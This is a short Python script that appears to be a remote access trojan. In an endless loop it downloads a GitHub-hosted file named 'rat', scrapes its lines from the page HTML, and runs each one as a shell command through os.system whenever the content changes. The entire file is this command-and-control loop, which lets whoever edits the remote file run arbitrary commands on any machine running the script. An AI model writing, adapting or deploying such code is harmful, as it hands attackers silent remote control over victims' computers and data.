from requests import get as req
from os import error, system as sys
from time import sleep as slp
from html import unescape
control=[]
while True:
    try:
        page= unescape(req("https://github.com/hmzdgn/Cloud/blob/main/rat").text)
        i=1
        start=[]
        finish=[]
        while True:
            start.append(page.find('<td id="LC{}" class="blob-code blob-code-inner js-file-line">'.format(i))+60)
            if start[-1] != 59:
                finish.append(page.find("</td>",start[-1]))
            else:
                try:
                    err=0
                    start.remove(59)
                except error:
                    print("error")
                    err=1
                break
            if err==1:
                continue
            i=i+1
        commands=[]
        for i in range(len(start)):
            commands.append(page[start[i]:finish[i]])
        if control != commands:
            for i in commands:
                sys(i)
        slp(1.5)
        control=commands.copy()
    except error:
        print("error")
